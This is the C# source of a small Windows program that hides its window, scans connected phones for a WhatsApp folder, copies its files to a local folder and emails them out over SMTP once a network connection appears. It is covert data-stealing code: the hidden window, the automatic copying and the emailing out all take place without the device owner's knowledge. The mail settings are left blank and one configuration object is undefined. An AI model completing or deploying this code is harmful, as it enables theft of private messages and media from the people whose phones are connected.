using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Text;
using System.Windows.Forms;
using PortableDeviceApiLib;
using PortableDevices;
//using PortableDevice = PortableDevices.PortableDevice;

using PortableDevice = PortableDeviceApiLib.PortableDevice;


namespace foolytrans
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            NetworkChange.NetworkAvailabilityChanged += NetworkChange_NetworkAvailabilityChanged;
            Hide();
            Teste();
        }

        private bool netAvailable = false;
        string dir = String.Format("{0}\\files", Application.StartupPath);
        void NetworkChange_NetworkAvailabilityChanged(object sender, NetworkAvailabilityEventArgs e)
        {
            if (netAvailable = e.IsAvailable)
                EnviaEmail();
        }

        private void Teste()
        {
            var collection = new PortableDeviceCollection();
            collection.Refresh();

            foreach (var device in collection)
            {
                device.Connect();
                //if (Directory.Exists(device.DeviceId + "\\Interno"))
                {
                    var folder = device.GetContents();
                    PortableDeviceObject whats = null;
                   whats = RetornaPasta(folder);
                    //device.Disconnect();
                    //PortableDeviceObject whats = folder.Files.First(x => x.Name.Equals("WhatsApp"));
                    if (whats != null)
                    {
                        PortableDeviceFolder folderwh = whats as PortableDeviceFolder;
                       
                        if (!Directory.Exists(dir))
                            Directory.CreateDirectory(dir);
                        folderwh = folderwh.Files[0] as PortableDeviceFolder;
                        foreach (var itens in folderwh.Files)
                        {
                            if (itens is PortableDeviceFile)
                                device.DownloadFile((PortableDeviceFile)itens,dir);
                        }
                    }
                }
            }
        }


        private void EnviaEmail()
        {
            if (!Directory.Exists(dir))
                return;
            using (MailMessage mail = new MailMessage())
            {

                SmtpClient SmtpServer = new SmtpClient("");
                mail.From = new MailAddress("");
                mail.To.Add("");
                mail.Subject = "foolish event";
                mail.BodyEncoding = Encoding.UTF8;
                mail.IsBodyHtml = false;
                Attachment attachment = new Attachment("");
                mail.Attachments.Add(attachment);
                SmtpServer.Port = (this.Configuracoes.PortaEmail > 0 ? this.Configuracoes.PortaEmail : 587);
                SmtpServer.Credentials = new NetworkCredential(this.Configuracoes.UserEmail, this.Configuracoes.SenhaEmail);
                SmtpServer.EnableSsl = (this.Configuracoes.AutenticaSSL.Equals(Commom.SIM));
                SmtpServer.Send(mail);
                SmtpServer.Dispose();
            }
        }

        private PortableDeviceFolder RetornaPasta(PortableDeviceFolder file)
        {
            PortableDeviceFolder whats = null;
            foreach (PortableDeviceFolder itens in file.Files)
            {
                if (itens.Name.Equals("WhatsApp"))
                    return itens;
                whats = whats ?? RetornaPasta(itens);
            }
            return whats;

        }

       
       
    }
}
